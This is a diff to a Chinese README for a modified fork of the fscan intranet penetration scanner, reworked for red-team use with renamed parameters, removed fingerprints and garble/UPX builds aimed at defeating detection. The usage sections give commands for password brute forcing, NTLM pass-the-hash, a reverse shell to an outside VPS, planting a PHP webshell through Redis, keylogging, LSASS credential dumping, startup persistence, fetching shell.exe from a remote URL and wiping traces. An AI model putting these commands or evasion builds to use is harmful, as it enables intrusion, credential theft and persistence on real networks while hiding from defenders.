@@ -1,6 +1,6 @@
 # Fscan 魔改版 — 内网渗透扫描工具
 
-> 基于 [fscan](https://github.com/shadow1ng/fscan) v2.2.0-rc 修改，针对红队场景进行了参数混淆与特征规避。
+> 基于 [fscan](https://github.com/shadow1ng/fscan) v2.1.3 修改，针对红队场景进行了参数混淆与特征规避。
 
 ---
 
@@ -30,19 +30,19 @@
 
 ```bash
 # 扫描一个 C 段（存活探测 + 端口扫描 + 服务识别 + 弱口令爆破 + POC）
-pscan.exe -t 192.168.1.0/24
+fscan.exe -t 192.168.1.0/24
 
 # 仅存活探测
-pscan.exe -t 192.168.1.0/24 -ao
+fscan.exe -t 192.168.1.0/24 -ao
 
 # 扫描单个主机
-pscan.exe -t 192.168.1.100
+fscan.exe -t 192.168.1.100
 
 # 扫描多个 IP 段
-pscan.exe -t 192.168.1.0/24,10.0.0.0/24
+fscan.exe -t 192.168.1.0/24,10.0.0.0/24
 
 # 从文件读取目标
-pscan.exe -tf targets.txt
+fscan.exe -tf targets.txt
 ```
 
 ---
@@ -55,34 +55,39 @@ pscan.exe -tf targets.txt
 |--------|------|
 | **参数名混淆** | 所有命令行参数重命名（见下方映射表） |
 | **Banner 静默** | 启动时不输出 fscan ASCII Logo 和版本信息 |
-| **模块名重命名** | Go 模块路径改为 `scanner/core`，去除项目名特征 |
-| **预编译二进制** | 提供 `pscan.exe` 和 `core.exe` 两个版本 |
+| **模块名更改** | Go 模块路径改为 `test`，去除 `fscan` 名字特征 |
+| **源码字符串清理** | 代码中不出现 `fscan` 相关特征字符串 |
 
 **原版 ↔ 魔改参数映射：**
 
-| 原参数 | 魔改后 | 说明 |
-|--------|--------|------|
+| 原版 fscan | 魔改后 | 说明 |
+|-----------|--------|------|
 | `-h` | **`-t`** | 目标 IP / 网段 / 域名 |
 | `-eh` | **`-et`** | 排除主机 |
 | `-ehf` | **`-etf`** | 排除主机文件 |
-| `-p` | **`-tp`** | 端口 |
+| `-p` / `-p` | **`-tp`** | 端口 |
 | `-ep` | **`-etp`** | 排除端口 |
-| `-hf` | **`-tf`** | 主机列表文件 |
-| `-pf` | **`-tpf`** | 端口列表文件 |
-| `-m` | **`-st`** | 扫描模式 |
-| `-t`（线程） | **`-tn`** | 端口扫描线程数 |
-| `-time` | **`-tm`** | 超时时间(秒) |
+| `-hf`（原主机文件） | **`-tf`** | 主机列表文件 |
+| `-pf`（原端口文件） | **`-tpf`** | 端口列表文件 |
+| `-userf` | **`-uf`** | 用户名字典文件（挤占原 `-uf` 位） |
+| `-pwdf` | **`-pf`** | 密码字典文件 |
+| `-uf`（原 URL 文件） | **`-urlf`** | URL 列表文件 |
+| `-u`（原 URL） | **`-url`** | Web 目标 URL |
 | `-user` | **`-usr`** | 用户名 |
 | `-pwd` | **`-pw`** | 密码 |
 | `-usera` | **`-ua`** | 额外用户名 |
 | `-pwda` | **`-pa`** | 额外密码 |
-| `-userf` | **`-usrf`** | 用户名字典文件 |
-| `-pwdf` | **`-pf`** | 密码字典文件 |
 | `-upf` | **`-up`** | 用户名:密码对文件 |
-| `-hashf` | **`-hf`** | 哈希文件 |
 | `-hash` | **`-hv`** | 哈希值 |
+| `-hashf` | **`-hf`** | 哈希文件 |
 | `-domain` | **`-dm`** | 域名 |
 | `-sshkey` | **`-sk`** | SSH 私钥 |
+| `-m` | **`-st`** | 扫描模式 |
+| `-t`（线程） | **`-tn`** | 端口扫描线程数 |
+| `-time` | **`-tm`** | 超时时间(秒) |
+| `-o` | **`-out`** | 输出文件 |
+| `-f` | **`-fmt`** | 输出格式 |
+
 
 ---
 
@@ -99,7 +104,7 @@ pscan.exe -tf targets.txt
   -etp string      排除端口
 
 扫描控制：
-  -st string       扫描模式: all(全部), icmp(存活探测), 或指定插件名 (default "all")
+  -st string       扫描模式: all, icmp, portscan 或指定插件名 (default "all")
   -ao              仅存活探测
   -tn int          端口扫描线程数 (default 600)
   -mt int          模块线程数 (default 20)
@@ -116,7 +121,7 @@ pscan.exe -tf targets.txt
   -pw string       密码
   -ua string       额外用户名 (逗号或空格分隔)
   -pa string       额外密码 (逗号或空格分隔)
-  -usrf string     用户名字典文件
+  -uf string       用户名字典文件
   -pf string       密码字典文件
   -up string       用户名:密码对文件
   -dm string       域名
@@ -133,6 +138,33 @@ pscan.exe -tf targets.txt
   -pocname string  POC 名称
   -num int         POC 并发数 (default 20)
   -dns             DNS 日志记录
+  -retry int       爆破重试次数 (default 3)
+
+后渗透参数：
+  -local string    执行本地插件 (如: systeminfo, cleaner, reverseshell)
+  -sc string       Shellcode 路径/URL
+  -rsh string      反弹 Shell 目标 (格式: ip:port)
+  -start-socks5 int 启动 SOCKS5 代理端口
+  -fsh-port int    正向 Shell 监听端口 (default 4444)
+  -persistence-file string 持久化文件路径
+  -win-pe string   Windows PE 文件路径
+  -keylog-output string 键盘记录输出文件 (default "keylog.txt")
+  -download-url string   文件下载 URL
+  -download-path string  文件下载保存路径
+
+Web 扫描：
+  -url string      Web 目标 URL
+  -urlf string     URL 列表文件
+  -cookie string   HTTP Cookie
+  -wt int          Web 请求超时秒 (default 5)
+  -max-redirect int 最大重定向次数 (default 10)
+
+Redis 利用：
+  -rf string       Redis 要写入的文件
+  -rs string       Redis SSH 公钥
+  -rwp string      Redis WebShell 写入路径
+  -rwc string      Redis WebShell 内容
+  -rwf string      Redis WebShell 文件名
 
 代理/网络：
   -proxy string    HTTP 代理
@@ -140,14 +172,14 @@ pscan.exe -tf targets.txt
   -iface string    指定本地网卡 IP
 
 输出：
-  -o string        输出文件 (default "result.txt")
-  -f string        输出格式: txt, json, csv (default "txt")
+  -out string      输出文件 (default "result.txt")
+  -fmt string      输出格式: txt, json, csv (default "txt")
   -no              禁用保存到文件
   -silent          静默模式
   -nocolor         禁用颜色
   -nopg            禁用进度条
   -debug           调试模式
-  -log string      日志级别
+  -log string      日志级别 (default "base,info,success")
   -perf            输出性能统计 JSON
 
 其他：
@@ -163,209 +195,209 @@ pscan.exe -tf targets.txt
 
 ```bash
 # 全量扫描整个 C 段（最常用）
-pscan.exe -t 192.168.1.0/24
+fscan.exe -t 192.168.1.0/24
 
 # 仅存活探测（快速定位在线主机）
-pscan.exe -t 192.168.1.0/24 -ao
+fscan.exe -t 192.168.1.0/24 -ao
 
 # ICMP 模式存活探测
-pscan.exe -t 192.168.1.0/24 -st icmp
-
-# 存活探测 + 仅在线主机做端口扫描（跳过离线主机）
-pscan.exe -t 192.168.1.0/24 -ao -st all
+fscan.exe -t 192.168.1.0/24 -st icmp
 
 # 扫描多个网段
-pscan.exe -t 192.168.1.0/24,10.10.0.0/16
+fscan.exe -t 192.168.1.0/24,10.10.0.0/16
 
 # 扫描 IP 范围
-pscan.exe -t 192.168.1.1-100
+fscan.exe -t 192.168.1.1-100
 
 # 排除特定主机
-pscan.exe -t 192.168.1.0/24 -et 192.168.1.1,192.168.1.254
+fscan.exe -t 192.168.1.0/24 -et 192.168.1.1,192.168.1.254
 
 # 从文件读取目标列表
-pscan.exe -tf targets.txt
+fscan.exe -tf targets.txt
 ```
 
 ### 2. 端口与协议控制
 
 ```bash
 # 扫描指定端口
-pscan.exe -t 192.168.1.0/24 -tp 22,80,443,3306,3389,6379
+fscan.exe -t 192.168.1.0/24 -tp 22,80,443,3306,3389,6379
 
 # 扫描常用 Web 端口
-pscan.exe -t 192.168.1.0/24 -tp 80,81,443,8080,8443,9090
+fscan.exe -t 192.168.1.0/24 -tp 80,81,443,8080,8443,9090
 
 # 扫描全部端口（慢，谨慎使用）
-pscan.exe -t 192.168.1.0/24 -tp 1-65535 -tn 1000
+fscan.exe -t 192.168.1.0/24 -tp 1-65535 -tn 1000
 
 # 排除特定端口
-pscan.exe -t 192.168.1.0/24 -etp 445,139
+fscan.exe -t 192.168.1.0/24 -etp 445,139
 
 # 跳过 Ping 探测（纯 TCP 扫描，适合禁 Ping 环境）
-pscan.exe -t 192.168.1.0/24 -np
+fscan.exe -t 192.168.1.0/24 -np
 
 # 跳过 TCP 补充探测
-pscan.exe -t 192.168.1.0/24 -ntp
+fscan.exe -t 192.168.1.0/24 -ntp
 
 # 调整扫描线程和超时（网络差时降低线程数）
-pscan.exe -t 192.168.1.0/24 -tn 200 -tm 5
+fscan.exe -t 192.168.1.0/24 -tn 200 -tm 5
 
 # 限制发包速率（规避流量检测）
-pscan.exe -t 192.168.1.0/24 -rate 1000
+fscan.exe -t 192.168.1.0/24 -rate 1000
 ```
 
 ### 3. 弱口令爆破
 
 ```bash
 # 全量扫描 + 自动爆破（默认开启）
-pscan.exe -t 192.168.1.0/24
+fscan.exe -t 192.168.1.0/24
 
 # 禁用爆破（只扫端口和服务识别）
-pscan.exe -t 192.168.1.0/24 -nobr
+fscan.exe -t 192.168.1.0/24 -nobr
 
 # 指定自定义凭据
-pscan.exe -t 192.168.1.0/24 -usr admin -pw admin123
+fscan.exe -t 192.168.1.0/24 -usr admin -pw admin123
 
 # 使用字典文件
-pscan.exe -t 192.168.1.0/24 -usrf users.txt -pf pass.txt
+fscan.exe -t 192.168.1.0/24 -uf users.txt -pf pass.txt
 
 # 使用用户名:密码对文件（每行 user:pass）
-pscan.exe -t 192.168.1.0/24 -up creds.txt
+fscan.exe -t 192.168.1.0/24 -up creds.txt
 
 # 添加额外用户/密码（与原字典合并）
-pscan.exe -t 192.168.1.0/24 -ua root,admin -pa 123456,password
+fscan.exe -t 192.168.1.0/24 -ua root,admin -pa 123456,password
 
 # 指定域名（用于域认证爆破）
-pscan.exe -t 192.168.1.0/24 -dm corp.local
+fscan.exe -t 192.168.1.0/24 -dm corp.local
 
 # SSH 私钥登录
-pscan.exe -t 192.168.1.100 -sk id_rsa
+fscan.exe -t 192.168.1.100 -sk id_rsa
 
 # NTLM 哈希传递
-pscan.exe -t 192.168.1.100 -hv "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
+fscan.exe -t 192.168.1.100 -hv "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
 ```
 
 ### 4. Web 扫描
 
 ```bash
 # 扫描单个 Web 站点
-pscan.exe -u http://192.168.1.100:8080
+fscan.exe -url http://192.168.1.100:8080
 
-# 扫描多个 URL
-pscan.exe -u http://192.168.1.100 -tp 80,443,8080
+# 扫描多个 URL（从文件读取）
+fscan.exe -urlf urls.txt
 
 # 带 Cookie 扫描
-pscan.exe -u http://192.168.1.100 -cookie "PHPSESSID=xxx"
+fscan.exe -url http://192.168.1.100 -cookie "PHPSESSID=xxx"
 
 # 使用 HTTP 代理
-pscan.exe -u http://192.168.1.100 -proxy http://127.0.0.1:8080
+fscan.exe -url http://192.168.1.100 -proxy http://127.0.0.1:8080
 
 # 使用 SOCKS5 代理
-pscan.exe -t 192.168.1.0/24 -socks5 socks5://127.0.0.1:1080
+fscan.exe -t 192.168.1.0/24 -socks5 socks5://127.0.0.1:1080
 
 # 指定网卡（VPN 场景）
-pscan.exe -t 10.8.0.0/24 -iface 10.8.0.5
+fscan.exe -t 10.8.0.0/24 -iface 10.8.0.5
 ```
 
 ### 5. POC 漏洞检测
 
 ```bash
 # 全量扫描 + POC 检测（默认开启）
-pscan.exe -t 192.168.1.0/24
+fscan.exe -t 192.168.1.0/24
 
 # 禁用 POC 扫描（加快速度）
-pscan.exe -t 192.168.1.0/24 -nopoc
+fscan.exe -t 192.168.1.0/24 -nopoc
 
 # 全量 POC 扫描（更全面但更慢）
-pscan.exe -t 192.168.1.0/24 -full
+fscan.exe -t 192.168.1.0/24 -full
 
 # 指定 POC 名称
-pscan.exe -t 192.168.1.100 -pocname thinkphp
+fscan.exe -t 192.168.1.100 -pocname thinkphp
 
 # 自定义 POC 脚本目录
-pscan.exe -t 192.168.1.100 -pocpath ./custom-pocs/
+fscan.exe -t 192.168.1.100 -pocpath ./custom-pocs/
 
 # 调整 POC 并发数
-pscan.exe -t 192.168.1.0/24 -num 10
+fscan.exe -t 192.168.1.0/24 -num 10
 
 # 启用 DNSLog
-pscan.exe -t 192.168.1.0/24 -dns
+fscan.exe -t 192.168.1.0/24 -dns
 ```
 
 ### 6. 凭据复用与哈希传递
 
 ```bash
 # NTLM 哈希传递（配合爆破模块使用）
-pscan.exe -t 192.168.1.100 -hv "31d6cfe0d16ae931b73c59d7e0c089c0"
+fscan.exe -t 192.168.1.100 -hv "31d6cfe0d16ae931b73c59d7e0c089c0"
 
 # 哈希文件批量传递
-pscan.exe -t 192.168.1.0/24 -hf hashes.txt
+fscan.exe -t 192.168.1.0/24 -hf hashes.txt
 
 # 复用域用户凭据
-pscan.exe -t 192.168.1.0/24 -usr administrator -pw P@ssw0rd -dm corp.local
+fscan.exe -t 192.168.1.0/24 -usr administrator -pw P@ssw0rd -dm corp.local
 ```
 
 ### 7. 后渗透利用
 
 ```bash
 # 查看所有可用本地插件
-pscan.exe -local list
+fscan.exe -local list
 
 # 收集系统信息
-pscan.exe -local systeminfo
+fscan.exe -local systeminfo
 
 # 反弹 Shell（先在外网 VPS 监听）
-pscan.exe -local reverseshell -rsh your-vps.com:4444
+fscan.exe -local reverseshell -rsh your-vps.com:4444
 
 # 启动正向 Shell（等待目标连接）
-pscan.exe -local forwardshell -fsh-port 4444
+fscan.exe -local forwardshell -fsh-port 4444
 
 # 启动 SOCKS5 代理（本地监听 1080）
-pscan.exe -local socks5proxy -start-socks5 1080
+fscan.exe -local socks5proxy -start-socks5 1080
 
 # Redis 写公钥
-pscan.exe -t 192.168.1.100 -st redis -rs "ssh-rsa AAAAB3N..."
+fscan.exe -t 192.168.1.100 -st redis -rs "ssh-rsa AAAAB3N..."
 
 # Redis 写 Webshell
-pscan.exe -t 192.168.1.100 -st redis -rwp /var/www/html -rwc "<?php system($_GET['cmd']);?>"
+fscan.exe -t 192.168.1.100 -st redis -rwp /var/www/html -rwc "<?php system($_GET['cmd']);?>"
 
 # 键盘记录
-pscan.exe -local keylogger -keylog-output keylog.txt
+fscan.exe -local keylogger -keylog-output keylog.txt
 
 # LSASS 凭证提取
-pscan.exe -local minidump
+fscan.exe -local minidump
 
 # Windows 持久化（启动项）
-pscan.exe -local winstartup -win-pe C:\shell.exe
+fscan.exe -local winstartup -win-pe C:\shell.exe
+
+# 文件下载
+fscan.exe -local download -download-url http://example.com/shell.exe -download-path C:\Users\Public\shell.exe
 
 # 清理痕迹
-pscan.exe -local cleaner
+fscan.exe -local cleaner
 ```
 
 ### 8. 输出控制
 
 ```bash
 # 指定输出文件
-pscan.exe -t 192.168.1.0/24 -o scan-result.txt
+fscan.exe -t 192.168.1.0/24 -out scan-result.txt
 
 # JSON 格式输出
-pscan.exe -t 192.168.1.0/24 -f json -o result.json
+fscan.exe -t 192.168.1.0/24 -fmt json -out result.json
 
 # CSV 格式输出
-pscan.exe -t 192.168.1.0/24 -f csv -o result.csv
+fscan.exe -t 192.168.1.0/24 -fmt csv -out result.csv
 
 # 不保存文件，仅屏幕输出
-pscan.exe -t 192.168.1.0/24 -no
+fscan.exe -t 192.168.1.0/24 -no
 
 # 静默模式（减少输出量）
-pscan.exe -t 192.168.1.0/24 -silent
+fscan.exe -t 192.168.1.0/24 -silent
 
 # 调试模式（详细日志）
-pscan.exe -t 192.168.1.0/24 -debug
+fscan.exe -t 192.168.1.0/24 -debug
 
 # 输出性能统计
-pscan.exe -t 192.168.1.0/24 -perf
+fscan.exe -t 192.168.1.0/24 -perf
 ```
 
 ---
@@ -390,10 +422,10 @@ pscan.exe -t 192.168.1.0/24 -perf
 
 ```bash
 # 示例：仅扫描 Redis 服务
-pscan.exe -t 192.168.1.0/24 -st redis
+fscan.exe -t 192.168.1.0/24 -st redis
 
 # 示例：仅扫描 SMB 和相关漏洞
-pscan.exe -t 192.168.1.0/24 -st smb
+fscan.exe -t 192.168.1.0/24 -st smb
 ```
 
 ---
@@ -465,13 +497,15 @@ pscan.exe -t 192.168.1.0/24 -st smb
 | `winwmi` | WMI 持久化 | Windows |
 | `winbits` | BITS 任务持久化 | Windows |
 | `winifeo` | IFEO 持久化 | Windows |
+| `avdetect` | 杀软检测 | Windows |
+| `download` | 文件下载 | 全平台 |
 
 ```bash
 # 列出所有本地插件
-pscan.exe -local list
+fscan.exe -local list
 
 # 使用特定插件
-pscan.exe -local systeminfo
+fscan.exe -local systeminfo
 ```
 
 ---
@@ -482,10 +516,7 @@ pscan.exe -local systeminfo
 
 ```bash
 # 启动 Web 服务
-pscan-web.exe
-
-# 指定监听端口
-pscan-web.exe -u
+fscan-web.exe
 
 # 启动后访问 http://127.0.0.1:8080
 ```
@@ -502,20 +533,28 @@ WebUI 功能：
 
 ## 构建方法
 
+此版本源码已去除 fscan 特征，构建时直接用 garble 混淆 + UPX 压缩即可，不需要普通 go build。
+
 ```bash
-# 基础构建
-go build -o pscan.exe .
+# 标准版（garble 混淆构建）
+garble -tiny -literals -seed=random build -ldflags="-s -w -buildid=" -trimpath -o fscan.exe .
 
-# 包含 WebUI 的版本
-go build -tags web -o pscan-web.exe .
+# 精简版（不含后渗透模块）
+garble -tiny -literals -seed=random build -tags nolocal -ldflags="-s -w -buildid=" -trimpath -o fscan-nolocal.exe .
 
-# 调试版本（保留符号）
-go build -o pscan-debug.exe -gcflags="all=-N -l" .
+# Web 版
+garble -tiny -literals -seed=random build -tags web -ldflags="-s -w -buildid=" -trimpath -o fscan-web.exe .
 
-# UPX 压缩（减小体积）
-upx -9 pscan.exe
-
-# 交叉编译
-GOOS=linux GOARCH=amd64 go build -o pscan_linux .
-GOOS=darwin GOARCH=amd64 go build -o pscan_macos .
+# UPX 压缩（LZMA 算法，30MB → ~8-10MB）
+upx --best --lzma fscan.exe -o fscan-upx.exe
+upx --best --lzma fscan-nolocal.exe -o fscan-nolocal-upx.exe
+upx --best --lzma fscan-web.exe -o fscan-web-upx.exe
 ```
+
+参数说明：
+- `-literals`：混淆字符串/整数字面量
+- `-tiny`：剥离符号表、缩减 PE 段表
+- `-seed=random`：每次构建随机种子，生成不同混淆结果
+- `-buildid=`：清空 build ID，去除编译器指纹
+- `--best --lzma`：最高压缩率 + LZMA 算法，对 Go 二进制效果最好
+- `-o` 输出到新文件：保留 garble 原始产物作为备份
